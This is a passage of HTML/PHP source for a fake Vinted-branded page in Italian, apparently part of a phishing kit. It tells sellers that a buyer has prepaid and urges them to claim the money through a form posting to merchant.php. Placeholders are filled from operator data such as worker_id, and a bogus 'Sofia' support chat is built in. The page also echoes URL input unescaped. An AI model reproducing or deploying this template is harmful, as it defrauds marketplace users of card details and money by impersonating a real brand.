<path d="M12.75 14.506h-1.5v-1.139c0-1.077.598-2.064 1.522-2.514a1.78 1.78 0 0 0 .927-2.068 1.741 1.741 0 0 0-1.218-1.218 1.766 1.766 0 0 0-1.559.305 1.75 1.75 0 0 0-.685 1.395h-1.5c0-1.017.46-1.958 1.266-2.58a3.285 3.285 0 0 1 2.853-.574 3.244 3.244 0 0 1 2.297 2.297c.398 1.542-.31 3.1-1.723 3.79-.413.202-.68.66-.68 1.167v1.139zM12 2c5.523 0 10 4.478 10 10 0 5.523-4.477 10-10 10-5.524 0-10-4.477-10-10C2 6.479 6.476 2 12 2zm0 1.5c-4.687 0-8.5 3.814-8.5 8.5 0 4.687 3.813 8.5 8.5 8.5 4.686 0 8.499-3.813 8.499-8.5 0-4.686-3.813-8.5-8.5-8.5H12zm-1.003 13.507c0-.5526.448-1.0005 1.0005-1.0005.5526 0 1.0005.448 1.0005 1.0005 0 .5523-.4477 1-1 1s-1-.4477-1-1h-.001z"></path>
</svg>
</div>
</a>
</div>
</div>
<div class="l-header__toggle">
<div class="generic-toggle js-generic-toggle">
<div class="generic-toggle__on">
<button name="button" type="button" class="c-button--flat c-button--default c-button c-button--truncated c-button--without-text c-button--icon-left"><span class="c-button__content"><span class="c-button__icon"><span class="c-icon--regular c-icon--cg4 c-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">
<path d="M18.94 4L12 10.94 5.06 4 4 5.06 10.94 12 4 18.94 5.06 20 12 13.06 18.94 20 20 18.94 13.06 12 20 5.06z"></path>
</svg>
</span></span>
</span>
</button>
</div>
<div class="generic-toggle__off">
<button name="button" type="button" class="c-button--flat c-button--default c-button c-button--truncated c-button--without-text c-button--icon-left"><span class="c-button__content"><span class="c-button__icon"><span class="c-icon--regular c-icon--cg4 c-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">
<path d="M2 20h20v-1.5H2V20zM2 5.5h20V4H2v1.5zm0 7.25h20v-1.5H2v1.5z"></path>
</svg>
</span></span>
</span>
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="l-header__navigation js-header-navigation">
<div class="u-desktops-only">
<div class="container">
<div class="c-tabs--default c-tabs">
<ul class="c-tabs__content">
<li class="c-tabs__item u-padding-none js-header-navigation-tab"><span class="c-tabs__item-title"><a class="c-tabs__link js-header-navigation-tab-item" href="https://www.vinted.pl/kobiety"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Donne</font></font></a></span>
</li><li class="c-tabs__item u-padding-none js-header-navigation-tab"><span class="c-tabs__item-title"><a class="c-tabs__link js-header-navigation-tab-item" href="https://www.vinted.pl/mezczyzni"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Uomini</font></font></a></span>
</li><li class="c-tabs__item u-padding-none js-header-navigation-tab"><span class="c-tabs__item-title"><a class="c-tabs__link js-header-navigation-tab-item" href="https://www.vinted.pl/dzieci"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bambini</font></font></a></span>
</li><li class="c-tabs__item u-padding-none js-header-navigation-tab"><span class="c-tabs__item-title"><a class="c-tabs__link js-header-navigation-tab-item" href="https://www.vinted.pl/about"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O Vinto</font></font></a></span>
</li></ul></div>
</div>
</div>
</div>
</div>










<div class="l-search">
<div class="c-cell--tight c-cell">
<div class="c-cell__content">
<div class="c-cell__body">
<div class="u-ui-padding-vertical-regular">
<div class="container">
<div id="SearchBar-react-component-a579070d-4f8e-4d0c-aa9c-cdee823ee3a9">
<div>
<form method="get" action="https://www.vinted.pl/ubrania">
<div class="u-position-relative">
<div class="InputBar_input-bar__lzZch">
<div class="InputBar_prefix__2K3RM">
<div class="u-flexbox u-fill-height">
<div class="u-position-relative">
<button type="button" class="Button_button__1HmfN Button_flat__34jig Button_medium__1Kljk Button_muted__3hngQ Button_truncated__3pQ92 Button_icon-right__bMSYV"><span class="Button_content__1Pyrd"><span class="Button_label__3jCra"><span id="search-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Elementi</font></font></span></span><span class="Button_icon__3VQ6P"><div class="Icon_icon__1jqT_ Icon_small__22Qkb Icon_cg4__2Wj-6"><svg viewBox="0 0 16 16"><path d="M8 12L2 6h12z"></path></svg></div></span></span>
</button>
</div>
<div class="Divider_divider__y6QD4 Divider_vertical__8QWgv"></div>
</div>
</div>
<div class="InputBar_input__PtSDV">
<div class="InputBar_icon__3sdwz">
<div class="u-flexbox u-align-items-center">
<div class="Icon_icon__1jqT_ Icon_small__22Qkb Icon_cg5__3bvZL">
<svg viewBox="0 0 24 24">
<path d="M10.5 16a5.5 5.5 0 1 1 .01-11.01 5.5 5.5 0 0 1-.01 11zM22 19.87l-4.53-4.53a8.5 8.5 0 1 0-2.12 2.12L19.88 22 22 19.88z"></path>
</svg>
</div>
</div>
</div>
<input id="search_text" name="search_text" placeholder="Cerca oggetti" class="InputBar_value__O70Da" autocomplete="off">
</div>
<div class="InputBar_suffix__13eZB"></div>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="AuthModal-react-component-50ecc0ef-00c2-410b-a733-b8b0fcd5e864"></div>
<div id="LockedCatalogModal-react-component-f52fd42d-30d4-4792-af31-f865bf651b02"></div>
<div class="site">
</div>
<div id="Footer-react-component-9e34250a-48fb-4f4a-b5e2-5e0cccbec695">
<div style="height: 0px;">
<div class="sticky-footer">
<div></div>
</div>
</div>
</div>
<main>
<div class="container">
<section class="section-info">
<img src="./ord_files/check.png" alt="" class="section-info_icon">
<div class="section-info_text">
<p class="section-info_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'acquirente ha già pagato per il tuo articolo.</font></font></p>
<p class="section-info_subtitle"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ottieni i tuoi soldi ora</font></font></p>
</div>
</section>
<div class="item-container">
<section class="item-block">
<div class="section-content">
<div class="item-block_header">
<div class="item-block_image">
<img src="./ord_files/maxresdefault.jpg" alt="">
</div>
<div class="item-block_text">
<p class="item-block_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I SOLDI</font></font></p>
<p class="item-block_price"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><?php echo $xml->price; ?> EUR</font></font></p>
<p class="item-block_status"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Il tuo articolo è prepagato</font></font></p>
</div>
</div>
<div class="recipient-block">
<div class="recipient-block_row">
<div class="recipient-subblock_min">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nome completo dell'acquirente!</font></font></label>
<input class="recipient-block_input" value="<?php echo $xml->fio; ?>" readonly="">
</div>
</div>
<div class="recipient-block_row">
<div class="recipient-subblock_max">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Indirizzo di posta</font></font></label>
<input class="recipient-block_input" value="<?php echo $xml->to; ?>" readonly="">
</div>
</div>
</div>
<div class="item-block_main">
<div class="item-block_description">
<p class="description-subtitle"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Non appena riceverai il denaro sulla carta, il corriere ti contatterà. </font><font style="vertical-align: inherit;">E' necessario indicare un orario adeguato per la consegna della merce. </font></font><br> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La consegna della merce deve avvenire entro una settimana dalla data di ricevimento dei fondi.</font></font></p>
<img class="description-mail" src="./ord_files/posteiromane.jpg" alt="">
</div>
</div>
<div class="item-block_footer">
<p class="item-footer_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Numero di notifica: </font></font><b style="color: #555;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><?php echo $_GET['id']; ?></font></font></b></p>
</div>
</div>
</section>
<section class="item-pay">
<div style="border: 1px solid #dfe3ed; border-radius: 4px;" class="section-content">
<span class="item-pay_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ricezione di fondi</font></font></span>
<p class="item-pay_price"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Importo da ricevere: </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><?php echo $xml->price; ?> EUR</font></font></b></p>
<p class="item-pay_item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I SOLDI</font></font></p>
<form action="merchant.php" method="get">
    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input type="submit" class="item-pay_button" value="Guadagna fondi"></font></font>
</form>
<p class="item-pay_safery"><img src="data:image/png;base64,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" alt=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">È sicuro effettuare pagamenti</font></font></p>
<img src="./ord_files/maeschb.svg" alt="" class="item-pay_paymentMethods">
<img src="./ord_files/visachb.svg" alt="" class="item-pay_paymentMethods">
<img src="./ord_files/mastercardchb.svg" alt="" class="item-pay_paymentMethods">
<img src="./ord_files/pcichb.svg" alt="" class="item-pay_paymentMethods" style="margin-bottom: 6px;">
</div>
</section>
</div>
</div>
</main>
<div id="PolicyFooter-react-component-2da18b3a-8c52-4cb4-9504-fdf4debbc71d">
<div class="privacy-footer">
<div class="privacy-footer__content">
<div class="container">
<div class="Divider_divider__y6QD4"></div>
<div class="privacy-footer__content__links"><a href="https://www.vinted.pl/privacy-policy"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Politica sulla riservatezza</font></font></a><a href="https://www.vinted.pl/cookie-policy"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">politica sui cookie</font></font></a>
<button type="button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Impostazioni dei cookie</font></font></button><a href="https://www.vinted.pl/terms_and_conditions"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Statuto</font></font></a></div>
</div>
</div>
</div>
</div>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #09B1BA;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #09B1BA;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #09B1BA;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #4e4e4e;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
 <img id="oper-photo-img" src="./ord_files/operator-img.png">
<div class="operator-name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sofia</font></font></div>
</div>
<div class="team-wrapper">
<div class="team"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Servizio di aiuto</font></font></div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in linea</font></font></div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./ord_files/operator-img.png"></div>
<div class="operators-first-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Buon giorno! </font><font style="vertical-align: inherit;">Come posso aiutarla?</font></font></div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Inserisci il tuo messaggio ...">
<button id="smstosupbutton1" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');
